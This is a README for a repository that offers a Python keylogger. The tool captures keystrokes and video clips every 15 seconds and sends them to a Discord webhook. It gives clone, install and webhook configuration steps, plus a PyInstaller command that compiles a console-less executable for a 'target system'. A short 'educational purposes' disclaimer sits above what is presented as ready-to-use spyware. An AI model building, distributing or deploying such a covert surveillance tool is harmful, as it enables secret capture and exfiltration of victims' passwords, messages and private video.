# Discord Webhook Keylogger and Video Sender

=====================================

Disclaimer: This software is provided for educational purposes only. Users are responsible for ensuring compliance with applicable laws and ethical use. Any misuse of this tool is strictly prohibited.

Overview:
This repository contains a Python script that captures keyboard inputs and sends them to a specified Discord webhook at 15-second intervals, along with video recordings taken at the same frequency.

Features:
- Captures keyboard input every 15 seconds.
- records video clips every 15 seconds.
- Sends captured data to a user-specified Discord webhook.
- Deletes recorded video clip once sent to a user-specified Discord webhook
- Supports compilation into an executable file using PyInstaller.

Setup Instructions:

Clone the Repository:
git clone https://github.com/Quantam1921/Discord-webhook-keylogger-and-video-sender

Navigate to Project Directory:
cd Discord-webhook-keylogger-and-video-sender

Install Dependencies:
Ensure you have Python installed on your system, then run:
pip install -r requirements.txt

Configure Webhook URL:
Open main.py in your preferred text editor and replace <YOUR_WEBHOOK_URL> with your actual Discord webhook URL.

Compile to Executable (Optional):
To create a standalone executable from the script, install PyInstaller if not already installed:
pip install pyinstaller

Then run:
pyinstaller main.py --onefile --noconsole --collect-all imageio

Usage Notes:
The compiled executable will be located in a new /dist directory within your project folder.

Ensure you have the necessary permissions on the target system to capture input and send data.
Use responsibly and in compliance with all applicable laws.
